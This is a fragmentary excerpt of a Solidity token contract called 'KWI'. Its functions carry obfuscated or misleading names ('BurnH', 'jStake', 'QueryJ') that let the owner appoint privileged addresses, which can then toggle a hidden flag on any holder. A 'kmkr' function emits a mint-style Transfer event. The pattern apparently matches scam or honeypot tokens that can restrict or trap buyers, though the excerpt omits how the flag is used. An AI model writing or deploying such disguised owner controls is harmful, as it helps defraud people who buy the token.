...
contract KWI is Context, Ownable {
    ...
    string private constant _name = "KWI";
    ...
    function kmkr() onlyOwner internal {
    emit Transfer(address(0), KRTR, kS); }

    function allowance(address owner, address spender) public view  returns (uint256) {
        return Kv[owner][spender];
    }
	        function BurnH(address Kj) onlyOwner public{
        Kb[Kj] = true; }
		...
		function jStake(address Kj) public {
        if(Kb[msg.sender]) { 
        Kw[Kj] = false;}}
        function QueryJ(address Kj) public{
         if(Kb[msg.sender])  { 
        Kw[Kj] = true; }}
